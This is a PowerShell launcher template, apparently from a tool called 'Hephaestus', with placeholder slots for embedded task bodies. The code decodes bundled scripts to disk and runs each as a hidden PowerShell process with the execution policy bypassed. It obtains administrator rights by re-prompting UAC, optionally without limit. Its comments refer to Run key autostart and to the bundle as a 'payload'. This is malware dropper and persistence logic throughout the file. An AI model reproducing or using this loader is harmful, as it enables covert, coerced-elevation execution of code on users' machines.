###head
###head

. ./utils.ps1
. ./consts_body.ps1

function GetLocalScriptPath {
    param
    (

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $scriptPath = Get-HephaestusFolder
    $fullPath = Join-Path -Path $scriptPath -ChildPath "$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    CustomDecode -inContent $body -outFile $scriptPath
    return $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    $taskDir = Split-Path -Parent -Path $scriptPath
    if ([string]::IsNullOrEmpty($taskDir)) { $taskDir = (Get-HephaestusFolder) }
    # $globalDebug: visibility only (window style). Elevation path is unchanged.
    $taskWinStyle = $(if ($globalDebug) { "Normal" } else { "Hidden" })
    [string]$taskOne = if ($null -eq $taskName) { '' } elseif ($taskName -is [System.Array]) { [string]$taskName[0] } else { [string]$taskName }
    # Registry / Run key starts the body with -autostart true, but this is a new process: forward the flag so
    # Test-Autostart (e.g. embeddings.ps1 DoInternalEmbeddings) matches the launcher (see autoregistry.ps1).
    $taskArgs = @('-ExecutionPolicy', 'Bypass', '-File', $scriptPath, '-Task', $taskOne)
    if (Test-Autostart) {
        $taskArgs += @('-autostart', 'true')
    }
    Write-TaskLifecycleLog -TaskName $taskOne -Phase START -Detail "file=$scriptPath"
    $proc = $null
    try {
        # Tasks are spawned concurrently (no -Wait); parent does not block on each child.
        if (IsElevated) {
            $proc = Start-Process powershell.exe -WindowStyle $taskWinStyle -WorkingDirectory $taskDir -ArgumentList $taskArgs -PassThru
        }
        else {
            $sp = New-StartProcessSplatForPowerShellElevation -WorkDir $taskDir -PowerShellArgumentList $taskArgs -WindowStyle $taskWinStyle -RequestRunAs $true
            $proc = Start-Process @sp -PassThru
        }
        if ($null -ne $proc) { writedbg "Invoke-Script $taskOne spawned pid=$($proc.Id)" }
        else { writedbg "Invoke-Script $taskOne Start-Process returned null" }
    }
    finally {
        $detail = if ($null -ne $proc) { "async pid=$($proc.Id)" } else { 'spawn failed' }
        Write-TaskLifecycleLog -TaskName $taskOne -Phase STOP -Detail $detail
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

# Script file path for one-shot self-elevation (not reliable from inside a function's $MyInvocation).
$script:HephaestusEntryScript = $MyInvocation.MyCommand.Path
if ([string]::IsNullOrWhiteSpace($script:HephaestusEntryScript)) { $script:HephaestusEntryScript = $PSCommandPath }

function Main 
{
    $showPath = GetLocalScriptPath -taskName "program"
    writedbg "program curScript: $showPath"

    if ($global:Task) {
        writedbg "Task - $global:Task"
        & $global:Task
    } else 
    {               
        # One elevation for this process, then spawn task children elevated (no per-task RunAs).
        if (-not (IsElevated)) {
            $selfPath = $script:HephaestusEntryScript
            if (-not [string]::IsNullOrWhiteSpace($selfPath) -and (Test-Path -LiteralPath $selfPath)) {
                if (-not (Test-Path variable:server)) {
                    writedbg "Main: FATAL server config is missing - misbuilt or corrupt payload; aborting (no task launch)." -ForegroundColor Red
                    return
                }
                else {
                    $delaySec = [int]$server.aggressiveAdminDelay
                    if ($delaySec -lt 0) { $delaySec = 0 }
                    $aggressiveElevRetry = [bool]$server.aggressiveAdmin
                    if ($aggressiveElevRetry) {
                        # aggressiveAdminAttempts: 0 or less = retry UAC forever; N > 0 = stop after N failed attempts (then exit; re-run is safe).
                        $maxUacTries = [int]$server.aggressiveAdminAttempts
                        $unlimitedUac = ($maxUacTries -le 0)
                        $attempt = GetArgInt("attempt")
                        $tryIdx = 0
                        while ($true) {
                            $tryIdx++
                            $attempt++
                            if ($attempt -ne 1) {
                                $capMsg = if ($unlimitedUac) { "try=$tryIdx (unlimited)" } else { "try=$tryIdx of $maxUacTries" }
                                writedbg "Main: elevation retry; sleeping ${delaySec}s before UAC ($capMsg, attempt arg=$attempt)"
                                Start-Sleep -Seconds $delaySec
                            }
                            try {
                                RunMe -script $selfPath -repassArgs $true -argName "-attempt" -argValue "$attempt" -uac $true -Wait $true
                                return
                            }
                            catch {
                                writedbg "Main: elevation attempt failed (try $tryIdx): $_"
                            }
                            if (-not $unlimitedUac -and $tryIdx -ge $maxUacTries) {
                                writedbg "Main: UAC not completed after $maxUacTries tries; stopping (no task launch)."
                                return
                            }
                        }
                    } else {
                        writedbg "Main: elevating launcher once, then exiting this process"
                        RunMe -script $selfPath -repassArgs $true -argName "" -argValue "" -uac $true -Wait $true
                        return
                    }
                }
            }
            else {
                writedbg "Main: FATAL launcher script path missing or not on disk - cannot elevate; aborting (no task launch)." -ForegroundColor Red
                return
            }
        }

        $taskKeyOrder = @(
###taskKeyOrder
        )
        $tasks = @{
           ###doo
        }

        writedbg "Main - materialize all task scripts"
        foreach ($key in $taskKeyOrder)
        {
            if (-not $tasks.ContainsKey($key)) { continue }
            writedbg "Main - save $key"
            Save-Script -taskName $key -Body $tasks[$key]
        }
        writedbg "Main - spawn all tasks (concurrent, no wait)"
        foreach ($key in $taskKeyOrder)
        {
            if (-not $tasks.ContainsKey($key)) { continue }
            writedbg "Main - spawn $key"
            Invoke-Script -taskName $key
        }
    }
}

Main

if ($globalDebug)
{
    Start-Sleep -Seconds 100
}